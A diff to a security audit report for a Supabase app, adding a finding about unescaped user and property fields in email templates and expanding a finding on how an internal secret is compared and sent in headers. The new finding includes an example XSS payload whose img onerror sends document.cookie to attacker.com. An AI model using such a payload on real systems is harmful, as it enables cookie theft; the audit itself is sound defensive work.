@@ -48,6 +48,7 @@
 | 25 | 🟡 MEDIUM | Database RPC | `fn_check_subscription_limit` / `fn_get_user_subscription` accept arbitrary `p_user_id` — subscription plan enumeration |
 | 26 | 🔵 LOW | Database | `clean_leads` SELECT policy `USING (true)` — all authenticated users read admin-uploaded staging leads |
 | 27 | 🟡 MEDIUM | Admin | `adminApi.ts` uses `localStorage.getItem('authToken')` (never set) — admin console broken in prod; insecure pattern for future backend |
+| 28 | 🔵 LOW | Email | `send-support-message` and `weekly-digest` inject `fullName` and property fields into HTML without escaping |
 
 ---
 
@@ -519,7 +520,7 @@ if (cached && cachedAt && Date.now() - Number(cachedAt) < ROLE_CACHE_TTL_MS) {
 
 ---
 
-## Finding 14 — 🟡 MEDIUM: `x-internal-secret` Uses Non-Constant-Time String Comparison
+## Finding 14 — 🟡 MEDIUM: `x-internal-secret` Pattern — Timing Attack and Service Role Key in HTTP Headers
 
 **Files:**
 - `supabase/functions/bulk-generate-missing-insights/index.ts:37`
@@ -528,13 +529,29 @@ if (cached && cachedAt && Date.now() - Number(cachedAt) < ROLE_CACHE_TTL_MS) {
 
 ### What's wrong
 
-All three functions authenticate internal calls by checking:
+**Issue A — Non-constant-time comparison:** All three functions authenticate internal calls by checking:
 
 ```typescript
 const isInternalCall = internalSecret === SUPABASE_SERVICE_ROLE_KEY;
 ```
 
 JavaScript's `===` operator short-circuits on the first non-matching character, creating a measurable timing difference. In theory, an attacker can brute-force the secret byte-by-byte by measuring response times. In practice, the service role key is 200+ characters, making this attack very slow over the internet. But the fix is trivial.
+
+**Issue B — Service role key transmitted in HTTP request headers:** When functions self-invoke (e.g., `scheduled-rescore` calling `refresh-outdated-insights`), the service role key is sent as the literal value of the `x-internal-secret` header:
+
+```typescript
+// scheduled-rescore calling another function:
+'x-internal-secret': SUPABASE_SERVICE_ROLE_KEY,   // ← full key in HTTP header
+```
+
+HTTP request headers are frequently captured in:
+- Application logging (Supabase edge function logs)
+- Infrastructure logs (Cloudflare, CDN, WAF)
+- APM/tracing tools (Datadog, Sentry breadcrumbs)
+
+If any of these logging systems are compromised, the service role key is exposed. The service role key bypasses all RLS policies and gives unrestricted database access.
+
+**Recommendation:** Use a separate dedicated `INTERNAL_FUNCTION_SECRET` environment variable (a random 32-byte hex string) as the inter-function auth credential, not the service role key. This limits blast radius if the inter-function secret is ever logged or leaked.
 
 ### Fix
 
@@ -792,6 +809,60 @@ Extract the authenticated user from the JWT and validate ownership:
 if (job.user_id !== authenticatedUserId) {
   return new Response(JSON.stringify({ error: 'Forbidden' }), { status: 403 });
 }
+```
+
+---
+
+## Finding 28 — 🔵 LOW: Email Templates Inject `fullName` and Property Data Without HTML Escaping
+
+**Files:**
+- `supabase/functions/send-support-message/index.ts:69-70` — `${fullName}` unescaped
+- `supabase/functions/weekly-digest/index.ts:48,64,67` — `${name}`, `${p.address}`, `${p.city}`, `${p.state}` unescaped
+
+### What's wrong
+
+Both email functions escape the user-supplied `message` body correctly (`replace(/</g, "&lt;")`) but inject other fields verbatim into the HTML template:
+
+**`send-support-message`:**
+```typescript
+// Line 69 — fullName is from user_metadata.full_name (user-controlled at signup)
+<p ...>From: ${fullName} (${email})</p>
+//           ^^^^^^^^^^^ NOT escaped
+```
+
+**`weekly-digest`:**
+```typescript
+// Line 48 — name from user.full_name (user-controlled)
+const name = userName || "there";
+// ...
+<p ...>Hey ${name},</p>
+//          ^^^^^^ NOT escaped
+
+// Lines 64-67 — property fields from DB, admin-controlled but imported from external data
+${p.address}
+${p.city}, ${p.state}
+```
+
+### Impact
+
+**`send-support-message`:** A user sets `full_name` to `John <img src=x onerror="fetch('https://attacker.com?c='+document.cookie)"> Doe` at signup. When they submit a support ticket, the support team's email client receives and may execute the injected HTML. Impact is limited to the support team's inbox.
+
+**`weekly-digest`:** The `name` field is user-controlled. More critically, property data (`address`, `city`, `state`) is imported from third-party data sources — a malicious data source providing property records with HTML in the address field would inject into every subscriber's weekly digest.
+
+### Fix
+
+Apply consistent HTML escaping to all interpolated values:
+
+```typescript
+const escapeHtml = (s: string | null | undefined) =>
+  (s ?? '').replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;')
+           .replace(/"/g, '&quot;').replace(/'/g, '&#39;');
+
+// In templates:
+From: ${escapeHtml(fullName)} (${escapeHtml(email)})
+Hey ${escapeHtml(name)},
+${escapeHtml(p.address)}
+${escapeHtml(p.city)}, ${escapeHtml(p.state)}
 ```
 
 ---
@@ -1070,6 +1141,7 @@ The backend should then verify this JWT using Supabase's JWT secret and confirm 
 21. Standardize Deno std library version across all functions
 22. Add `SET search_path = public` to any remaining SECURITY DEFINER functions without it
 23. Review `clean_leads` SELECT policy — confirm `USING (true)` is intentional and not exposing staging data
+24. Apply `escapeHtml()` to `fullName`, property addresses in `send-support-message` and `weekly-digest` email templates
 
 ---
 
